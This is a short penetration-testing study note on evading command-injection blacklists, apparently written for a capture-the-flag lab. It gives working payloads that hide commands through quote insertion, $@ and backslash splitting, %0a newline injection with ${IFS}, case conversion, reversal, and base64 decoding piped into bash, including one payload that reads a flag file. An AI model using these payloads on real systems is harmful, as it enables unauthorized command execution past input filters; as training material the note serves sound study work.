Tags: [[Burpsuite]] [[Command Injection]] [[Cybersecurity]] [[Penetration Testing]] [[Filter Evasion]] [[Blacklisted Commands]] #blacklisted_commands

One easy obfuscation technique is inserting a `'` in between command letters. The command will run the same as if it was spelled out without the `'` .
```Bash
w'h'o'am'i
```

You cannot mix `"` and `'` it has to be one or the other. We can also use `$@` or `\`

```bash
who$@ami
w\ho\am\i
```

### Example Command
```Bash
%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
# This would equate to /n cat /hom/1nj3c7or/flag.txt
```

## Advanced Command Obfuscation

Transform a command from uppercase into lowercase. We can use this command as a advanced way of obfuscating a command like `whoami`

```bash
%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WHOAMI") 
```

## Reversing Commands

```bash
 $(rev<<<'imaohw')
```

```bash
# Command in linux terminal
echo 'whoami' | rev
# Here we are piping whoami into the rev command
```

## Encoding Commands

```bash
echo -n 'ls /home' | base64
bHMgL2hvbWU=

# Now we can copy the base64 and use it in a command. 

%0abash<<<$(base64%09-d<<<bHMgL2hvbWU=)
# This would be evaluated and the command would be ls /home The command insie the brackett will will decode the base64 and send it to the bashcommand. 

```